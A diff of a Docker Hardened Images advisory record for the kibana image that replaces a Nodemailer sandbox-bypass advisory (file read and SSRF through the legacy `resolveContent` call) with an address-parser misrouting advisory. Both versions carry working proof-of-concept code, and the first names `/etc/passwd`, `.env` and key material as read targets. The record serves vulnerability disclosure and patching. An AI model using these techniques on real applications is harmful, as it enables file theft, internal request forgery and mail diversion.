@@ -1,17 +1,17 @@
 {
   "schema_version": "1.8.0",
-  "id": "DHI-gj26-fvpp-wwhn-tdd5",
+  "id": "DHI-ioeq-vakf-75ga-z4lh",
   "modified": "2026-09-27T02:08:22Z",
-  "published": "2026-09-26T23:54:22Z",
+  "published": "2026-09-27T02:08:22Z",
   "upstream": [
-    "GHSA-8m3c-c648-2xjj"
+    "GHSA-cc9r-2j5m-2m83"
   ],
   "summary": "### Summary",
-  "details": "### Summary\n\nNodemailer's `disableFileAccess` / `disableUrlAccess` options are a security sandbox that lets an application forbid untrusted message content (`html`/`text`/attachment `path`/`href`) from reading local files or making outbound HTTP(S) requests. The fix for GHSA-wqvq-jvpq-h66f (commit `5f69497`) threaded these flags through the library's internal resolution paths (`MailMessage.resolveAll()` and `_convertDataImages()`), but the public plugin API `MailMessage.resolveContent(...args)` (`lib/mailer/mail-message.js:41-43`) remains a raw passthrough to `shared.resolveContent()`.\n\nWhen called with the documented legacy signature `mail.resolveContent(data, key, callback)`, `shared.resolveContent` normalizes the missing options argument to an empty object (`options = options || {}`, `lib/shared/index.js:530`). The message-level flags that the `MailMessage` constructor already copied into `mail.data` (`lib/mailer/mail-message.js:34-38`) are silently discarded, so `resolveContentValue` skips both access-control guards and reaches `nmfetch(url)` (SSRF, `lib/shared/index.js:588`) or `fs.createReadStream(path)` (arbitrary file read, `lib/shared/index.js:597`).\n\nA plugin or application code that resolves message content through the documented API (the same API the library's own `_convertDataImages` uses, threading the flags explicitly) thereby bypasses the sandbox an application deliberately enabled.\n\n### Details\n\nRoot cause. The `MailMessage` constructor stores the transporter-level sandbox flags on the message object (`lib/mailer/mail-message.js:34-38`):\n\n```js\n['disableFileAccess', 'disableUrlAccess', 'normalizeHeaderKey', 'maxRecipients'].forEach(key => {\n    if (key in options) {\n        this.data[key] = options[key];\n    }\n});\n```\n\nThe public resolver is a pure passthrough (`lib/mailer/mail-message.js:41-43`):\n\n```js\nresolveContent(...args) {\n    return shared.resolveContent(...args);\n}\n```\n\n`shared.resolveContent` supports the legacy 3-argument signature and collapses the missing options to `{}` (`lib/shared/index.js:524-530`):\n\n```js\nmodule.exports.resolveContent = (data, key, options, callback) => {\n    // options is optional; support the legacy resolveContent(data, key, callback) signature\n    if (!callback && typeof options === 'function') {\n        callback = options;\n        options = false;\n    }\n    options = options || {};\n    ...\n    resolveContentValue(data, key, options, callback);\n```\n\n`resolveContentValue` then checks `options.disableUrlAccess` / `options.disableFileAccess` (`lib/shared/index.js:581` / `:590`), both `undefined` for the legacy signature, so it falls through to `nmfetch` (`:588`) or `fs.createReadStream` (`:597`).\n\nContrast with the fixed paths. `resolveAll()` (`lib/mailer/mail-message.js:112-115`) and `_convertDataImages()` (`lib/mailer/index.js:437-440`) both pass the message flags explicitly. The MIME streaming path (`lib/mime-node/index.js:1059-1077`) also honors the flags. So an application that enables the sandbox and then calls `transporter.sendMail()` is protected; the bypass appears only when message content is resolved through the public legacy-signature API — which is the documented plugin usage (the `resolveContent` JSDoc at `lib/shared/index.js:510-523` states it is \"useful when you want to create a plugin that needs a content value\").\n\nAffected versions. Confirmed on `9.1.0` (HEAD `efd6e29c10c6e0c25c57bd2f2a71302838235a4f`, the current npm latest). The gap was introduced by the GHSA-wqvq-jvpq-h66f fix and is still present; the public API has no regression coverage (`test/mailer/mail-message-test.js` contains no `resolveContent` test).\n\n### PoC\n\nRequires: `nodemailer@9.1.0`, a readable local file, and any reachable HTTP endpoint (loopback suffices). Non-destructive; no network egress beyond a local listener.\n\n```js\n'use strict';\nconst nodemailer = require('nodemailer');\nconst MailMessage = require('nodemailer/lib/mailer/mail-message');\n\nconst TARGET_FILE = '/app/src/package.json';   // any readable local file\nconst SSRF_URL = 'http://http-sink:8080/poc-ssrf'; // any local/internal HTTP target\n\nconst transporter = nodemailer.createTransport({\n    streamTransport: true,\n    disableFileAccess: true,   // sandbox explicitly enabled\n    disableUrlAccess: true\n});\n\nconst data = {\n    from: 'a@example.com', to: 'b@example.com', subject: 'poc', text: 'hello',\n    html: { path: TARGET_FILE },\n    attachments: [{ filename: 'x.bin', href: SSRF_URL }]\n};\nconst mail = new MailMessage(transporter, data);\n// mail.data.disableFileAccess === true, mail.data.disableUrlAccess === true\n\n// Documented legacy plugin signature — options argument omitted:\nmail.resolveContent(mail.data, 'html', (err, value) => {\n    if (err) return console.log('BLOCKED', err.code);\n    console.log('FILE_READ_OK len=', value.length);          // -> 1647 (package.json)\n});\nmail.resolveContent(mail.data.attachments, 0, (err, body) => {\n    if (err) return console.log('BLOCKED', err.code);\n    console.log('URL_FETCH_OK body=', body.toString());      // -> fetched response\n});\n```\n\nObserved output on the audit environment (Node 22, `nodemailer@9.1.0`):\n\n```text\nmail.data.disableFileAccess = true | disableUrlAccess = true\n[CONTROL resolveAll] err = EFILEACCESS : File access rejected for /app/src/package.json\n[CONTROL html.path explicit-options] err = EFILEACCESS\n[BYPASS html.path legacy] READ OK len = 1647 head = \"{\\n    \\\"name\\\": \\\"nodemailer\\\",\\n    \\\"version\\\": \\\"9.1.0\\\",\\n    \\\"des\"\n[BYPASS att[0].href legacy] FETCH OK len = 13 body = \"HTTP-SINK OK\\n\"\n```\n\nThe negative controls (`resolveAll`, and `resolveContent` with explicit `{ disableFileAccess: true }`) return `EFILEACCESS`, proving the sandbox works on the protected paths and only the legacy-signature passthrough is bypassed. The same bypass reproduces inside a real `transporter.sendMail()` flow when a `compile` plugin calls `mail.resolveContent(mail.data, 'html', cb)` / `mail.resolveContent(mail.data.attachments, 0, cb)`.\n\n### Impact\n\nAn application that enables `disableFileAccess` / `disableUrlAccess` to contain untrusted message content and that resolves content through the documented plugin API (`mail.resolveContent(data, key, callback)`) has its sandbox silently bypassed:\n\n- Arbitrary local file disclosure: a message `html`/attachment `path` pointing at a server file (`/etc/passwd`, `.env`, key material) is read and returned to the caller / delivered in the message.\n- Server-side request forgery: a message `href` pointing at an internal or loopback URL is fetched from the application host.\n\nReachability precondition: the sandbox flags must be enabled (default off) and the application or its plugin must invoke the documented legacy-signature API on attacker-influenced data. The default `transporter.sendMail()` path remains protected, so this is a defense-in-depth gap in the library's own access-control enforcement rather than a default-flow bypass. It is the same vulnerability class as the previously accepted GHSA-wqvq-jvpq-h66f (CVE-2026-82660) and GHSA-p6gq-j5cr-w38f (CVE-2026-82659), on a distinct third code path.",
+  "details": "### Summary\n\nNodemailer's email-address parser treats an **RFC 5322 comment** `( ... )` inside the domain as a point to **concatenate** the surrounding text, rather than as folding whitespace (CFWS) that **terminates** the domain. Consequently a recipient address such as `user@good-corp.com(x)evil.com` is parsed and **delivered to `good-corp.comevil.com`** (registrable domain `comevil.com`, attacker‑controlled), while a conformant RFC 5322 parser terminates the domain at the comment and reads `good-corp.com`.\n\nAn application that decides *whether it is allowed to email a recipient* by parsing/validating the recipient's domain — with a strict RFC 5322 parser (used without inspecting parse defects) or with a naive prefix/substring allow‑list — and then hands the raw address to Nodemailer for delivery, can be induced to send mail to a domain the attacker controls. This is an **Interpretation Conflict (CWE‑436)**, the same class as CVE‑2025‑13033, reached through the RFC 5322 *comment* construct (the \"Comments\" technique in PortSwigger's *Splitting the email atom* research, which produced a Postfix fix).\n\nSeverity is **Moderate**: exploitation requires the app's domain check to disagree with Nodemailer (see **Impact** for exactly which parsers do and do not). Verified end‑to‑end against a real RFC 5321 SMTP server (nodemailer 9.0.6 → `aiosmtpd`).\n\n### Details\n\nRoot cause is in `lib/addressparser/index.js`.\n\n1. The tokenizer registers the comment as an operator pair (`Tokenizer.operators`):\n   ```js\n   '(': ')',            // line ~331\n   ```\n2. When the **closing** `)` is immediately followed by a non‑break character (anything other than space / tab / CR / LF / `,` / `;`), the tokenizer marks that operator token with `noBreak = true`:\n   ```js\n   // Tokenizer.checkChar, lines ~398-399\n   if (nextChr && ![' ', '\\t', '\\r', '\\n', ',', ';'].includes(nextChr)) {\n       this.node.noBreak = true;\n   }\n   ```\n3. `_handleAddress` then **glues** the token that follows the comment onto the token that preceded it (dropping the comment):\n   ```js\n   // _handleAddress, lines ~187-188\n   if (prevToken && prevToken.noBreak && data[state].length) {\n       data[state][data[state].length - 1] += token.value;   // <-- concatenation\n   }\n   ```\n\nFor the input `user@good-corp.com(x)evil.com` the tokens are `text:\"user@good-corp.com\"`, `op:\"(\"`, `text:\"x\"`, `op:\")\"` (flagged `noBreak`), `text:\"evil.com\"`. Step 3 appends `evil.com` onto `user@good-corp.com`, producing the single domain **`good-corp.comevil.com`**. The comment content (`x`) is discarded into the display‑name field.\n\nRFC 5322 defines a comment as CFWS — semantically folding whitespace — and it may **not** appear inside a `dot-atom`. A comment therefore *separates* tokens and terminates the domain; the conformant reading of `good-corp.com(x)evil.com` is the domain `good-corp.com` (with the trailing `evil.com` being invalid/ignored). Nodemailer instead concatenates the two atoms across the removed comment, yielding a different, attacker‑registrable domain.\n\nNodemailer uses the parsed address for **both** the SMTP envelope (`getEnvelope()` → `RCPT TO`) and the emitted `To:`/`From:` headers, so the entire message is routed to the concatenated domain.\n\n**Related grammar defect (bonus, lower impact):** nested comments are legal in RFC 5322, but the tokenizer closes the comment at the *first* `)` (`chr === this.operatorExpecting`, line ~392), so a valid nested comment such as `user@x.com(a(b)c)` is mis‑balanced and mangled to `x.comc)`. That particular output contains a stray `)` and is **rejected** by a conformant MTA (501) — a bounce/robustness issue, not a misroute.\n\n**Suggested fix:** treat a comment as folding whitespace that terminates the current token — i.e. do **not** propagate `noBreak` across a comment‑closing `)` (restrict the `noBreak` optimization to quoted‑string closes), and support nested comments per RFC 5322. Equivalently, never emit a domain formed by concatenating two atoms that were separated only by a comment.\n\n### PoC\n\nEnvironment: Node.js ≥ 18 and the published `nodemailer@9.0.6`. No special transport configuration is required; the discrepancy is in address parsing.\n\n`poc-comment.js`:\n```js\n'use strict';\nconst net = require('net');\nconst nodemailer = require('nodemailer'); // 9.0.6\n\nconst TRUSTED   = 'good-corp.com';\nconst RECIPIENT = 'user@good-corp.com(x)evil.com'; // RFC 5322 comment (x) between two domains\n\n// tiny SMTP sink that prints the literal RCPT TO nodemailer transmits\nconst server = net.createServer(sock => {\n  let buf = ''; sock.write('220 sink\\r\\n');\n  sock.on('data', d => { buf += d; let i;\n    while ((i = buf.indexOf('\\r\\n')) >= 0) { const line = buf.slice(0, i); buf = buf.slice(i + 2);\n      const u = line.toUpperCase();\n      if (u.startsWith('EHLO')) sock.write('250-sink\\r\\n250 8BITMIME\\r\\n');\n      else if (u.startsWith('RCPT')) { console.log('nodemailer transmits :', line); sock.write('250 ok\\r\\n'); }\n      else if (u.startsWith('DATA')) sock.write('354 go\\r\\n');\n      else if (line === '.') sock.write('250 ok\\r\\n');\n      else if (u.startsWith('QUIT')) { sock.write('221 bye\\r\\n'); sock.end(); }\n      else sock.write('250 ok\\r\\n'); } });\n});\nserver.listen(0, '127.0.0.1', async () => {\n  const t = nodemailer.createTransport({ host: '127.0.0.1', port: server.address().port, secure: false });\n  await t.sendMail({ from: 'app@good-corp.com', to: RECIPIENT, subject: 'hi', text: 'x' });\n  t.close(); server.close();\n});\n```\n\nRun:\n```\nnpm init -y && npm install nodemailer@9.0.6\nnode poc-comment.js\n```\n\nActual output (nodemailer 9.0.6):\n```\nnodemailer transmits : RCPT TO:<user@good-corp.comevil.com>\n```\n\nThe application asked to mail `user@good-corp.com(x)evil.com`; Nodemailer delivers to `good-corp.comevil.com` — registrable domain `comevil.com`, which an attacker can register.\n\n**Verified against a real RFC 5321 server** (containerized lab included with this report — `docker compose up --build`, case `R8_comment_glue`, receiver = `aiosmtpd`):\n```\nwire RCPT TO                     : RCPT TO:<user@good-corp.comevil.com>\nreal server                      : ACCEPTED (250)\nrecipient parsed by real server  : user@good-corp.comevil.com   (domain good-corp.comevil.com)\ndelivered To header              : x <user@good-corp.comevil.com>\n```\n\n**Which parser sees what** (the crux of exploitability):\n\n| Parser used by the application to gate/route | Domain it reads from `user@good-corp.com(x)evil.com` | Deceived? |\n|---|---|---|\n| Python `email.policy.default` (strict RFC 5322) | `good-corp.com` *(flags `InvalidHeaderDefect`)* | Yes, if defects are not checked |\n| Naive prefix / substring allow‑list (`startsWith`/`includes('@good-corp.com')`) | `good-corp.com` | Yes |\n| Nodemailer's own `addressparser` | `good-corp.comevil.com` | No |\n| Python `email.utils.getaddresses` | `good-corp.comevil.com` | No |\n| WHATWG `url.domainToASCII` | `good-corp.com(x)evil.com` | No |\n\n### Impact\n\n\n\n* **Who is impacted:** applications that make a security or routing decision on the recipient **domain** using a parser that terminates the domain at the comment, while relying on Nodemailer for delivery — specifically those that validate with a strict RFC 5322 parser **without inspecting parse defects**, or with a **prefix/substring/allow‑list** check (e.g. \"only send to `@good-corp.com`\", employee‑only flows, \"same‑tenant\" routing). Applications that validate with Nodemailer's own `addressparser`, `email.utils.getaddresses`, or `url.domainToASCII` are **not** affected, which is why this is rated below the IDN/Punycode issue.\n\n## Patched in 9.1.0\n\nFixed in [902b63e](https://github.com/nodemailer/nodemailer/commit/902b63e).\n\nNot propagating `noBreak` across the closing `)` on its own breaks valid addresses, because CFWS is legal on either side of the `@`: `user@(x)good-corp.com` and `user(x)@good-corp.com` both come out mangled. A comment now joins what it separates only when one side carries the `@`, so those keep resolving while `user@good-corp.com(x)evil.com` terminates at `good-corp.com`.\n\nQuoted-string and angle-address joining are unchanged. Nested comments are still not modelled, but the misroute is gone: `user@x.com(a(b)c)` now yields `user@x.com`.",
   "severity": [
     {
       "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
     }
   ],
   "affected": [
@@ -19,36 +19,10 @@
       "package": {
         "ecosystem": "Docker Hardened Images",
         "name": "kibana",
-        "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=12"
-      },
-      "versions": [
-        "9.0.0-debian12",
-        "9.0.1-debian12",
-        "9.0.2-debian12",
-        "9.0.3-debian12",
-        "9.0.4-debian12",
-        "9.0.5-debian12"
-      ],
-      "database_specific": {
-        "owner_kind": "IMAGE"
-      }
-    },
-    {
-      "package": {
-        "ecosystem": "Docker Hardened Images",
-        "name": "kibana",
         "purl": "pkg:docker/dhi/kibana?os_name=debian&os_version=13"
       },
       "versions": [
-        "9.0.5-debian13",
-        "9.0.6-debian13",
-        "9.0.7-debian13",
-        "9.0.8-debian13",
         "9.1.10-debian13",
-        "9.1.2-debian13",
-        "9.1.3-debian13",
-        "9.1.4-debian13",
-        "9.1.5-debian13",
         "9.1.8-debian13",
         "9.1.9-debian13",
         "9.2.2-debian13",
@@ -653,27 +627,27 @@
   "references": [
     {
       "type": "ADVISORY",
-      "url": "https://scout.docker.com/v/DHI-gj26-fvpp-wwhn-tdd5"
+      "url": "https://scout.docker.com/v/DHI-ioeq-vakf-75ga-z4lh"
     },
     {
       "type": "ADVISORY",
-      "url": "https://github.com/advisories/GHSA-8m3c-c648-2xjj"
+      "url": "https://github.com/advisories/GHSA-cc9r-2j5m-2m83"
     },
     {
       "type": "ADVISORY",
-      "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-8m3c-c648-2xjj"
+      "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-cc9r-2j5m-2m83"
     },
     {
       "type": "FIX",
-      "url": "https://github.com/nodemailer/nodemailer/commit/dc48ed395c4d6c79ee5c95eb6eff17bafe391474"
+      "url": "https://github.com/nodemailer/nodemailer/pull/1848"
     },
     {
       "type": "FIX",
-      "url": "https://github.com/nodemailer/nodemailer/commit/ab7ef348b9a97b1fd70e7bfbeb56d4ea4a07946b"
+      "url": "https://github.com/nodemailer/nodemailer/commit/902b63e935435c30f4025901c0902dce64cd8880"
     },
     {
       "type": "WEB",
-      "url": "https://github.com/nodemailer/nodemailer/releases/tag/v9.1.1"
+      "url": "https://github.com/nodemailer/nodemailer/releases/tag/v9.1.0"
     }
   ]
 }
